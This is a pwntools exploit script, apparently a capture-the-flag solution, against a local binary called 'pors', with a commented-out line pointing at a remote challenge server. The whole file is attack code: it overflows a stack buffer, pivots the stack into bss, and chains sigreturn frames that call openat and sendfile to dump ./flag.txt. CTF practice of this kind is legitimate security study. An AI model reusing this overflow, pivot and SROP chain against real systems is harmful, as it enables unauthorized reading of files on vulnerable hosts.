from pwn import *

r = process("./pors")
# r = remote("193.148.168.30", 7668)

pop_rdi = 0x4012ec
ret = 0x4012ed
bss = 0x404800
read_ = 0x40131c
syscall = 0x4010b0

payload = b"A" * 0x20
payload += p64(bss + 0x20)
payload += p64(read_) # bss + 0x28부터 rsp 시작 (stack pivot)

pause()
r.send(payload)

context.arch = "amd64"
openat_frame = SigreturnFrame()
openat_frame.rdi = 0x101
openat_frame.rsi = -100 
openat_frame.rdx = bss
openat_frame.rcx = 0
openat_frame.rip = syscall
openat_frame.rsp = bss + 0x138

sendfile_frame = SigreturnFrame()
sendfile_frame.rdi = 0x28
sendfile_frame.rsi = 1
sendfile_frame.rdx = 3
sendfile_frame.rcx = 0
sendfile_frame.r8 = 100
sendfile_frame.rip = syscall
sendfile_frame.rsp = 0x404100

# bss + 0x0
payload = b"./flag.txt\x00\x00\x00\x00\x00\x00" 
payload += b"A" * 0x18
payload += p64(pop_rdi)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(openat_frame)
payload += p64(pop_rdi)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(sendfile_frame)
payload += p64(ret)
pause()
r.send(payload)
pause()
r.interactive()